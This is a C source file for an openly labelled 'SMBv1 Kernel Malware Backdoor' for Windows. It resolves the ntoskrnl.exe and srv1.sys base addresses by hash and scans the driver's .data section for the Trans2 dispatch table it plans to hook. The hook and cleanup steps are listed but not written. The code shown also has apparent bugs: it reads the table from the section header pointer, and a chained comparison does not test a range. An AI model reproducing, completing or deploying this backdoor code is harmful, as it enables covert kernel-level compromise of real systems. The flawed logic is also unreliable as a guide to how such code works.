/*
 * Copyright (c) 2020 Austin Hudson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIEDi
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include <windows.h>
#include "pe_util.h"
#include "hs_util.h"
#include "winapi.h"
#include "hashes.h"

#define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
#define NT_HDR(x) (PIMAGE_NT_HEADERS)\
(RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))

INT WindowsEntrypoint()
{
  struct Functions Func = { 0 };
  struct Drivers   Drvs = { 0 };

  /*!
   * SMBv1 Kernel Malware Backdoor.
   *
   * Process:
   * 	1) Hook MSR_LSTAR, and execute the payload
   * 	at PASSIVE_LEVEL. [DONE]
   * 	2) Locate ntoskrnl.exe and srv1.sys base
   * 	addresses. [DONE]
   * 	3) Locate srv1!SrvTransaction2DispatchTable
   * 	in the .data section of the PE. [DONE]
   * 	4) Hook srv!SrvTransaction2DispatchTable[14]
   * 	to point to the new hook.
   * 	5) Cleanup by returning "0" to free the 
   * 	payload in memory.
  !*/

  Drvs.NtosKrnlBase = GetPeBase(HASH_NTOSKRNL);
  Drvs.SrvSmbv1Base = GetPeBase(HASH_SRVSMBV1);
  if (( Drvs.NtosKrnlBase != NULL ) && 
      ( Drvs.SrvSmbv1Base != NULL ) )
  {
    PIMAGE_NT_HEADERS     NtsHdr = 0;
    PIMAGE_SECTION_HEADER SecHdr = 0;

    LPVOID                SecPtr = 0;
    LPVOID               *TrnTbl = 0;
    DWORD                 SecNum = 0;

    NtsHdr = NT_HDR(Drvs.SrvSmbv1Base);
    SecHdr = IMAGE_FIRST_SECTION(NtsHdr);

    for ( int i = 0 
    ; i < NtsHdr->FileHeader.NumberOfSections ; 
    i++ )
    {
      if ( 
        HashStringDjb2(&SecHdr[i].Name, 0) == HASH_DATA
      ) { 
        SecPtr = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base, 
	  SecHdr[i].VirtualAddress); 
	SecNum = SecHdr[i].Misc.VirtualSize; break; 
      };
    };

    TrnTbl = (LPVOID *)SecHdr;

    do {
      if (( TrnTbl[9]  == TrnTbl[11])  &&
	  ( TrnTbl[9]  == TrnTbl[12])  &&
	  ( TrnTbl[11] == TrnTbl[12])  &&
	  ( TrnTbl[18] == 0))
      {
        if (
	   Drvs.SrvSmbv1Base < TrnTbl[0] < 
	   ((LPVOID)(((ULONG_PTR)Drvs.SrvSmbv1Base) + 
	   NtsHdr->OptionalHeader.SizeOfImage)) 
	) break;
      }; TrnTbl++;
    } while ( SecNum-- != 0 );

  };

  return 0;
};
